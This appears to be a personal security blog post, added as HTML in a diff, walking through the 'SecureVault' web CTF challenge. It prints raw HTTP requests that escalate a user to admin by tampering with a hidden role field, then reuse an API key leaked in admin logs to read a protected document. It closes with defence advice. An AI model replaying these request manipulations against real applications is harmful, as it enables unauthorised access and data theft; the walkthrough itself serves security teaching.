@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>CTF Walkthrough: Web Exploitation Challenge — Francis Kuria</title>
+  <meta name="description" content="Step-by-step breakdown of solving a complex web exploitation CTF challenge, covering reconnaissance, vulnerability discovery, and exploitation techniques." />
+  
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>" />
+
+  <style>
+    :root{
+      --bg-start: #020617;
+      --bg-end: #0f172a;
+      --card: rgba(17,24,39,0.95);
+      --text: #e5e7eb;
+      --muted: #9ca3af;
+      --accent: #22c55e;
+      --accent-hover: #16a34a;
+      --focus: #0a66c2;
+      --radius: 12px;
+      --container: 800px;
+      --border: rgba(255,255,255,0.06);
+    }
+
+    *{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth}
+    body{
+      font-family: "Times New Roman", Times, serif;
+      background: linear-gradient(180deg,var(--bg-start),var(--bg-end));
+      color:var(--text);
+      line-height:1.8;
+      font-size:18px;
+      -webkit-font-smoothing:antialiased;
+      min-height:100vh;
+    }
+
+    a { color:var(--accent); text-decoration:none; transition:all .2s ease; }
+    a:hover { color:var(--accent-hover); text-decoration:underline; }
+    .container{ max-width:var(--container); margin:0 auto; padding:1.5rem 1.25rem; }
+
+    header{ 
+      padding:1.5rem 0; 
+      border-bottom:1px solid var(--border);
+      background:rgba(2,6,23,0.8);
+      backdrop-filter:blur(10px);
+      position:sticky;
+      top:0;
+      z-index:100;
+    }
+    .header-content{
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      max-width:var(--container);
+      margin:0 auto;
+      padding:0 1.25rem;
+    }
+    .brand{ 
+      font-weight:700; 
+      font-size:1.1rem;
+      display:flex;
+      align-items:center;
+      gap:0.5rem;
+      color:var(--text);
+    }
+    .brand:hover{ color:var(--accent); text-decoration:none; }
+    .back-link{
+      color:var(--muted);
+      font-size:0.95rem;
+    }
+    .back-link:hover{
+      color:var(--accent);
+    }
+
+    .article-header{
+      padding:3rem 0 2rem;
+      border-bottom:1px solid var(--border);
+    }
+    .article-meta{
+      display:flex;
+      gap:1rem;
+      flex-wrap:wrap;
+      color:var(--muted);
+      font-size:0.95rem;
+      margin-bottom:1.5rem;
+    }
+    .tags{
+      display:flex;
+      gap:0.5rem;
+      flex-wrap:wrap;
+      margin-bottom:1rem;
+    }
+    .tag{
+      background:#0b1220;
+      color:var(--accent);
+      padding:0.35rem 0.75rem;
+      border-radius:6px;
+      font-size:0.85rem;
+      font-weight:600;
+      border:1px solid rgba(34,197,94,0.2);
+    }
+    h1{
+      font-size:clamp(2rem,5vw,2.75rem);
+      margin-bottom:1rem;
+      font-weight:700;
+      line-height:1.2;
+    }
+    .lead{
+      font-size:1.25rem;
+      color:var(--muted);
+      line-height:1.6;
+      margin-bottom:1.5rem;
+    }
+    .author-info{
+      display:flex;
+      align-items:center;
+      gap:1rem;
+      padding:1.5rem 0;
+    }
+    .author-avatar{
+      width:60px;
+      height:60px;
+      border-radius:50%;
+      border:2px solid var(--accent);
+    }
+    .author-details h4{
+      font-size:1rem;
+      margin-bottom:0.25rem;
+    }
+    .author-details p{
+      color:var(--muted);
+      font-size:0.9rem;
+    }
+
+    article{
+      padding:2.5rem 0;
+    }
+    article h2{
+      font-size:1.75rem;
+      margin:2.5rem 0 1rem;
+      font-weight:700;
+      color:var(--accent);
+    }
+    article h3{
+      font-size:1.35rem;
+      margin:2rem 0 1rem;
+      font-weight:700;
+    }
+    article p{
+      margin-bottom:1.5rem;
+      color:var(--text);
+    }
+    article ul, article ol{
+      margin-bottom:1.5rem;
+      padding-left:2rem;
+    }
+    article li{
+      margin-bottom:0.75rem;
+    }
+    article strong{
+      color:var(--accent);
+      font-weight:700;
+    }
+
+    pre{
+      background:#0b1220;
+      border:1px solid var(--border);
+      border-radius:8px;
+      padding:1.25rem;
+      overflow-x:auto;
+      margin:1.5rem 0;
+      font-family:'Courier New', monospace;
+      font-size:0.9rem;
+      line-height:1.6;
+    }
+    code{
+      background:#0b1220;
+      padding:0.2rem 0.5rem;
+      border-radius:4px;
+      font-family:'Courier New', monospace;
+      font-size:0.9em;
+      color:#22c55e;
+    }
+    pre code{
+      background:transparent;
+      padding:0;
+      color:#e5e7eb;
+    }
+
+    .callout{
+      background:var(--card);
+      border-left:4px solid var(--accent);
+      border-radius:8px;
+      padding:1.25rem 1.5rem;
+      margin:1.5rem 0;
+    }
+    .callout-warning{
+      border-left-color:#f59e0b;
+    }
+    .callout-info{
+      border-left-color:#3b82f6;
+    }
+    .callout h4{
+      font-size:1.1rem;
+      margin-bottom:0.5rem;
+      display:flex;
+      align-items:center;
+      gap:0.5rem;
+    }
+    .callout p{
+      margin-bottom:0;
+      color:var(--muted);
+    }
+
+    .toc{
+      background:var(--card);
+      border:1px solid var(--border);
+      border-radius:var(--radius);
+      padding:1.5rem;
+      margin:2rem 0;
+    }
+    .toc h3{
+      font-size:1.1rem;
+      margin:0 0 1rem;
+      color:var(--accent);
+    }
+    .toc ul{
+      list-style:none;
+      padding:0;
+      margin:0;
+    }
+    .toc li{
+      margin-bottom:0.5rem;
+    }
+    .toc a{
+      color:var(--muted);
+      text-decoration:none;
+    }
+    .toc a:hover{
+      color:var(--accent);
+    }
+
+    .step-box{
+      background:var(--card);
+      border:1px solid var(--border);
+      border-radius:var(--radius);
+      padding:1.5rem;
+      margin:1.5rem 0;
+      border-left:4px solid var(--accent);
+    }
+    .step-header{
+      display:flex;
+      align-items:center;
+      gap:1rem;
+      margin-bottom:1rem;
+    }
+    .step-number{
+      background:var(--accent);
+      color:#052e16;
+      width:40px;
+      height:40px;
+      border-radius:50%;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      font-weight:700;
+      font-size:1.2rem;
+      flex-shrink:0;
+    }
+    .step-title{
+      font-size:1.2rem;
+      font-weight:700;
+      margin:0;
+    }
+
+    .flag-box{
+      background:linear-gradient(135deg, #052e16 0%, #14532d 100%);
+      border:2px solid var(--accent);
+      border-radius:var(--radius);
+      padding:1.5rem;
+      margin:2rem 0;
+      text-align:center;
+    }
+    .flag-box h4{
+      color:var(--accent);
+      margin-bottom:0.75rem;
+      font-size:1.3rem;
+    }
+    .flag-value{
+      font-family:'Courier New', monospace;
+      font-size:1.1rem;
+      color:#22c55e;
+      background:#0b1220;
+      padding:0.75rem;
+      border-radius:6px;
+      word-break:break-all;
+    }
+
+    .article-footer{
+      border-top:1px solid var(--border);
+      padding:2rem 0;
+      margin-top:3rem;
+    }
+    .share-buttons{
+      display:flex;
+      gap:0.75rem;
+      margin-bottom:2rem;
+    }
+    .share-btn{
+      padding:10px 16px;
+      background:var(--card);
+      border:1px solid var(--border);
+      border-radius:8px;
+      color:var(--text);
+      cursor:pointer;
+      transition:all .2s ease;
+      text-decoration:none;
+      font-size:0.9rem;
+      font-weight:600;
+    }
+    .share-btn:hover{
+      background:var(--accent);
+      color:#052e16;
+      border-color:var(--accent);
+      text-decoration:none;
+    }
+
+    .nav-posts{
+      display:grid;
+      grid-template-columns:1fr 1fr;
+      gap:1rem;
+      margin-top:2rem;
+    }
+    .nav-post{
+      background:var(--card);
+      border:1px solid var(--border);
+      border-radius:var(--radius);
+      padding:1.25rem;
+      transition:all .2s ease;
+      text-decoration:none;
+    }
+    .nav-post:hover{
+      border-color:var(--accent);
+      transform:translateY(-4px);
+      text-decoration:none;
+    }
+    .nav-label{
+      font-size:0.85rem;
+      color:var(--muted);
+      margin-bottom:0.5rem;
+    }
+    .nav-title{
+      color:var(--text);
+      font-weight:600;
+    }
+
+    footer{ 
+      text-align:center; 
+      padding:2.5rem 0; 
+      color:var(--muted); 
+      font-size:.9rem;
+      border-top:1px solid var(--border);
+    }
+
+    @media (max-width:768px){
+      body{ font-size:16px; }
+      .nav-posts{ grid-template-columns:1fr; }
+      .share-buttons{ flex-wrap:wrap; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="header-content">
+      <a href="../index.html" class="brand">
+        <span>🛡️</span>
+        <span>Francis Kuria</span>
+      </a>
+      <a href="index.html" class="back-link">← All Posts</a>
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="article-header">
+      <div class="tags">
+        <span class="tag">CTF</span>
+        <span class="tag">Web Exploitation</span>
+        <span class="tag">Tutorial</span>
+      </div>
+      
+      <h1>CTF Walkthrough: Web Exploitation Challenge</h1>
+      
+      <p class="lead">Complete walkthrough of "SecureVault," a medium-difficulty web exploitation CTF challenge. Learn systematic reconnaissance, vulnerability discovery, and exploitation techniques to capture the flag.</p>
+      
+      <div class="article-meta">
+        <span>📅 January 10, 2026</span>
+        <span>•</span>
+        <span>⏱️ 12 min read</span>
+        <span>•</span>
+        <span>💬 15 comments</span>
+        <span>•</span>
+        <span>⭐ Difficulty: Medium</span>
+      </div>
+
+      <div class="author-info">
+        <img class="author-avatar" src="../assets/francis-avatar.webp" alt="Francis Kuria" width="60" height="60">
+        <div class="author-details">
+          <h4>Francis Kuria</h4>
+          <p>Cybersecurity Analyst & Technical Writer</p>
+        </div>
+      </div>
+    </div>
+
+    <article>
+      <div class="callout callout-info">
+        <h4>🎯 Challenge Overview</h4>
+        <p><strong>Name:</strong> SecureVault | <strong>Category:</strong> Web Exploitation | <strong>Points:</strong> 250 | <strong>Solves:</strong> 47/500</p>
+        <p><strong>Description:</strong> "We've built a secure document management system. Can you find the admin's secret document?"</p>
+      </div>
+
+      <div class="toc">
+        <h3>📑 Table of Contents</h3>
+        <ul>
+          <li><a href="#initial-recon">Initial Reconnaissance</a></li>
+          <li><a href="#discovery">Vulnerability Discovery</a></li>
+          <li><a href="#authentication">Bypassing Authentication</a></li>
+          <li><a href="#escalation">Privilege Escalation</a></li>
+          <li><a href="#flag">Capturing the Flag</a></li>
+          <li><a href="#lessons">Key Takeaways</a></li>
+        </ul>
+      </div>
+
+      <h2 id="initial-recon">Initial Reconnaissance</h2>
+      
+      <div class="step-box">
+        <div class="step-header">
+          <div class="step-number">1</div>
+          <h3 class="step-title">Explore the Application</h3>
+        </div>
+        <p>I started by accessing the challenge URL: <code>http://ctf.example.com:8080</code></p>
+      </div>
+
+      <p>The application presented a clean login page with two main features:</p>
+      <ul>
+        <li>User login form</li>
+        <li>"Register new account" link</li>
+        <li>Generic corporate branding for "SecureVault Document Manager"</li>
+      </ul>
+
+      <p>I created a test account (<code>testuser / Password123!</code>) and logged in to explore the authenticated interface.</p>
+
+      <h3>Mapping Application Functionality</h3>
+
+      <p>After logging in, I identified several key endpoints:</p>
+
+      <pre><code>GET  /dashboard              - User dashboard
+GET  /documents              - Document listing
+POST /documents/upload       - Upload new document
+GET  /documents/view?id=123  - View specific document
+GET  /profile                - User profile page
+POST /profile/update         - Update user information</code></pre>
+
+      <p>I uploaded a test document and observed the URL structure when viewing it:</p>
+
+      <pre><code>http://ctf.example.com:8080/documents/view?id=c4ca4238a0b923820dcc509a6f75849b</code></pre>
+
+      <p>The ID appeared to be an MD5 hash. This was my first clue.</p>
+
+      <div class="callout callout-info">
+        <h4>💡 Reconnaissance Tip</h4>
+        <p>Always create a test account to explore authenticated functionality. Map all endpoints, parameters, and behaviors systematically before attempting exploitation.</p>
+      </div>
+
+      <h2 id="discovery">Vulnerability Discovery</h2>
+
+      <div class="step-box">
+        <div class="step-header">
+          <div class="step-number">2</div>
+          <h3 class="step-title">Identify Weaknesses</h3>
+        </div>
+        <p>Systematic testing revealed multiple potential attack vectors.</p>
+      </div>
+
+      <h3>Testing for IDOR (Insecure Direct Object Reference)</h3>
+
+      <p>I experimented with the document ID parameter. My uploaded document had ID <code>c4ca4238a0b923820dcc509a6f75849b</code>.</p>
+
+      <p>I tried sequential IDs by computing MD5 hashes of numbers:</p>
+
+      <pre><code>$ echo -n "1" | md5sum
+c4ca4238a0b923820dcc509a6f75849b  # My document
+
+$ echo -n "2" | md5sum
+c81e728d9d4c2f636f067f89cc14862c
+
+$ echo -n "3" | md5sum
+eccbc87e4b5ce2fe28308fd9f2a7baf3</code></pre>
+
+      <p>Testing these IDs:</p>
+
+      <pre><code>http://ctf.example.com:8080/documents/view?id=c81e728d9d4c2f636f067f89cc14862c</code></pre>
+
+      <p><strong>Result:</strong> Access denied. The application checked ownership—good security practice for normal documents.</p>
+
+      <h3>Examining User Roles</h3>
+
+      <p>In my profile page, I noticed a hidden field in the HTML source:</p>
+
+      <pre><code><form action="/profile/update" method="POST">
+  <input type="text" name="username" value="testuser">
+  <input type="email" name="email" value="test@example.com">
+  <input type="hidden" name="role" value="user">
+  <button type="submit">Update Profile</button>
+</form></code></pre>
+
+      <p>The <code>role</code> field was suspicious. Could I modify this?</p>
+
+      <div class="callout callout-warning">
+        <h4>⚠️ Hidden Clue Found</h4>
+        <p>Hidden form fields often contain sensitive data that developers assume can't be modified. This is a common security mistake.</p>
+      </div>
+
+      <h2 id="authentication">Bypassing Authentication</h2>
+
+      <div class="step-box">
+        <div class="step-header">
+          <div class="step-number">3</div>
+          <h3 class="step-title">Exploit Mass Assignment</h3>
+        </div>
+        <p>Attempting to escalate privileges through profile update.</p>
+      </div>
+
+      <h3>Testing Role Modification</h3>
+
+      <p>I used Burp Suite to intercept the profile update request and modified the role parameter:</p>
+
+      <pre><code>POST /profile/update HTTP/1.1
+Host: ctf.example.com:8080
+Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+Content-Type: application/x-www-form-urlencoded
+
+username=testuser&email=test@example.com&role=admin</code></pre>
+
+      <p><strong>Response:</strong></p>
+
+      <pre><code>HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "success": true,
+  "message": "Profile updated successfully",
+  "user": {
+    "username": "testuser",
+    "email": "test@example.com",
+    "role": "admin"
+  }
+}</code></pre>
+
+      <p><strong>Success!</strong> The application accepted my role modification without validation. This is a classic mass assignment vulnerability.</p>
+
+      <div class="callout">
+        <h4>🔓 Vulnerability Identified</h4>
+        <p><strong>Mass Assignment:</strong> The application blindly accepted all submitted form fields without validating which fields users should be allowed to modify. The role field should have been excluded from user updates.</p>
+      </div>
+
+      <h3>Verifying Privilege Escalation</h3>
+
+      <p>After refreshing the dashboard, I noticed new menu options:</p>
+
+      <ul>
+        <li>Admin Panel</li>
+        <li>User Management</li>
+        <li>System Documents</li>
+      </ul>
+
+      <p>The privilege escalation was successful. I now had admin-level access.</p>
+
+      <h2 id="escalation">Exploring Admin Functionality</h2>
+
+      <div class="step-box">
+        <div class="step-header">
+          <div class="step-number">4</div>
+          <h3 class="step-title">Navigate Admin Features</h3>
+        </div>
+        <p>Discovering sensitive admin-only resources.</p>
+      </div>
+
+      <h3>Accessing the Admin Panel</h3>
+
+      <p>The admin panel revealed several interesting features:</p>
+
+      <pre><code>GET /admin/users
+- Lists all registered users
+
+GET /admin/documents  
+- Shows all documents in the system
+
+GET /admin/logs
+- System activity logs</code></pre>
+
+      <p>Visiting <code>/admin/documents</code>, I saw a list of all documents including:</p>
+
+      <pre><code>| ID  | Title                | Owner          | Uploaded      |
+|-----|---------------------|----------------|---------------|
+| 1   | test.txt            | testuser       | 2026-01-10    |
+| 2   | Meeting Notes       | john_admin     | 2026-01-08    |
+| 3   | Budget Report       | sarah_finance  | 2026-01-07    |
+| 42  | flag.txt           | root_admin     | 2026-01-01    |</code></pre>
+
+      <p>Document ID 42 immediately caught my attention. The flag was likely in that document.</p>
+
+      <h3>Attempting Direct Access</h3>
+
+      <p>I calculated the MD5 hash of "42":</p>
+
+      <pre><code>$ echo -n "42" | md5sum
+a1d0c6e83f027327d8461063f4ac58a6</code></pre>
+
+      <p>Then attempted to access the document:</p>
+
+      <pre><code>http://ctf.example.com:8080/documents/view?id=a1d0c6e83f027327d8461063f4ac58a6</code></pre>
+
+      <p><strong>Response:</strong></p>
+
+      <pre><code>HTTP/1.1 403 Forbidden
+Content-Type: application/json
+
+{
+  "error": "Access denied. This document requires root privileges."
+}</code></pre>
+
+      <p>Even with admin role, I couldn't access the root-owned document. There had to be another way.</p>
+
+      <h2 id="flag">Capturing the Flag</h2>
+
+      <div class="step-box">
+        <div class="step-header">
+          <div class="step-number">5</div>
+          <h3 class="step-title">Final Exploitation</h3>
+        </div>
+        <p>Discovering the path to root-level access.</p>
+      </div>
+
+      <h3>Examining Admin Logs</h3>
+
+      <p>I checked the <code>/admin/logs</code> endpoint and found interesting entries:</p>
+
+      <pre><code>[2026-01-10 10:23:45] User 'testuser' role changed to 'admin'
+[2026-01-09 14:32:11] API key regenerated for user 'root_admin'
+[2026-01-09 14:32:11] New API key: sk_live_a84f3c2e9d1b7f6a...</code></pre>
+
+      <p>The logs exposed an API key! This was clearly a severe information disclosure vulnerability.</p>
+
+      <h3>Using the API Key</h3>
+
+      <p>I explored the API documentation (accessible at <code>/api/docs</code>) and found:</p>
+
+      <pre><code>GET /api/documents/{id}
+Authorization: Bearer {api_key}
+
+Returns document content regardless of ownership when valid API key is provided.</code></pre>
+
+      <p>Perfect! I crafted the request:</p>
+
+      <pre><code>GET /api/documents/42 HTTP/1.1
+Host: ctf.example.com:8080
+Authorization: Bearer sk_live_a84f3c2e9d1b7f6a...
+
+HTTP/1.1 200 OK
+Content-Type: text/plain
+
+Congratulations! Here's your flag:
+
+FLAG{m4ss_4ss1gnm3nt_l34ds_t0_pr1v_3sc_4nd_1nf0_d1scl0sur3}</code></pre>
+
+      <div class="flag-box">
+        <h4>🚩 FLAG CAPTURED</h4>
+        <div class="flag-value">FLAG{m4ss_4ss1gnm3nt_l34ds_t0_pr1v_3sc_4nd_1nf0_d1scl0sur3}</div>
+      </div>
+
+      <h2 id="lessons">Key Takeaways & Lessons Learned</h2>
+
+      <p>This challenge demonstrated a realistic attack chain exploiting multiple vulnerabilities:</p>
+
+      <h3>Vulnerabilities Exploited</h3>
+
+      <ol>
+        <li><strong>Mass Assignment (CWE-915):</strong> The application allowed users to modify their role through the profile update endpoint without proper validation.</li>
+        <li><strong>Broken Access Control (OWASP A01:2021):</strong> Admin panel was accessible to any user with admin role, regardless of how they obtained it.</li>
+        <li><strong>Information Disclosure (CWE-200):</strong> System logs exposed sensitive API keys that should never be logged or displayed.</li>
+        <li><strong>Insecure Direct Object Reference (IDOR):</strong> While mitigated for regular documents, the API endpoint bypassed ownership checks with valid credentials.</li>
+      </ol>
+
+      <h3>Defense Recommendations</h3>
+
+      <div class="callout">
+        <h4>🛡️ How to Prevent These Vulnerabilities</h4>
+        <p><strong>Mass Assignment:</strong> Implement allowlists for user-modifiable fields. Never trust client input for sensitive fields like roles, permissions, or internal IDs.</p>
+        <p><strong>Access Control:</strong> Implement proper role-based access control with server-side validation. Check both authentication (who you are) and authorization (what you can access).</p>
+        <p><strong>Sensitive Data in Logs:</strong> Never log credentials, API keys, tokens, or other secrets. Implement proper secret management and rotation.</p>
+        <p><strong>API Security:</strong> Apply the same authorization checks to API endpoints as you do to web interfaces. APIs are not "trusted" channels.</p>
+      </div>
+
+      <h3>CTF Strategy Insights</h3>
+
+      <p>This challenge taught me several valuable lessons about CTF problem-solving:</p>
+
+      <ul>
+        <li><strong>Be Systematic:</strong> Map all functionality before attempting exploitation. Understanding the full application helps identify attack chains.</li>
+        <li><strong>Read the Source:</strong> View page source, check JavaScript files, and examine HTML comments. Developers often leave hints.</li>
+        <li><strong>Test Everything:</strong> Don't assume security controls work as intended. Test authentication, authorization, input validation, and access controls.</li>
+        <li><strong>Chain Vulnerabilities:</strong> Real-world and CTF scenarios often require combining multiple smaller vulnerabilities for full exploitation.</li>
+        <li><strong>Document Your Process:</strong> Taking notes helps when you need to backtrack or when similar patterns appear in other challenges.</li>
+      </ul>
+
+      <h3>Tools Used</h3>
+
+      <pre><code># Reconnaissance
+- Browser Developer Tools
+- curl for HTTP requests
+
+# Exploitation  
+- Burp Suite for request interception
+- md5sum for hash generation
+- Python for automation scripting
+
+# Documentation
+- Note-taking in Markdown
+- Screenshots for evidence</code></pre>
+
+      <h2>Conclusion</h2>
+
+      <p>SecureVault was an excellent medium-difficulty challenge that demonstrated how multiple minor vulnerabilities can chain together for significant impact. The realistic attack path—privilege escalation leading to information disclosure leading to full compromise—mirrors many real-world penetration testing scenarios.</p>
+
+      <p>If you enjoyed this walkthrough and want to practice similar challenges, check out platforms like:</p>
+
+      <ul>
+        <li><strong>HackTheBox:</strong> Realistic penetration testing labs</li>
+        <li><strong>PortSwigger Web Security Academy:</strong> Excellent web vulnerability training</li>
+        <li><strong>PentesterLab:</strong> Guided web exploitation exercises</li>
+        <li><strong>CTFtime:</strong> Find upcoming CTF competitions</li>
+      </ul>
+
+      <div class="callout">
+        <h4>📚 Next Steps</h4>
+        <p>Practice these concepts in your own labs. Try to reproduce similar vulnerabilities in safe, controlled environments. Understanding both exploitation and remediation makes you a better security professional.</p>
+      </div>
+    </article>
+
+    <div class="article-footer">
+      <div class="share-buttons">
+        <span style="color:var(--muted);margin-right:0.5rem;">Share:</span>
+        <a href="#" class="share-btn">Twitter</a>
+        <a href="#" class="share-btn">LinkedIn</a>
+        <a href="#" class="share-btn">Copy Link</a>
+      </div>
+
+      <div class="nav-posts">
+        <a href="api-security-practices.html" class="nav-post">
+          <div class="nav-label">← Previous Post</div>
+          <div class="nav-title">5 Essential API Security Best Practices</div>
+        </a>
+        <a href="sql-injection-guide.html" class="nav-post" style="text-align:right;">
+          <div class="nav-label">Next Post →</div>
+          <div class="nav-title">Understanding SQL Injection: A Practical Guide</div>
+        </a>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div class="container">
+      <p>© 2026 Francis Kuria • <a href="../index.html">Portfolio</a> • <a href="index.html">Blog</a></p>
+    </div>
+  </footer>
+</body>
+</html>
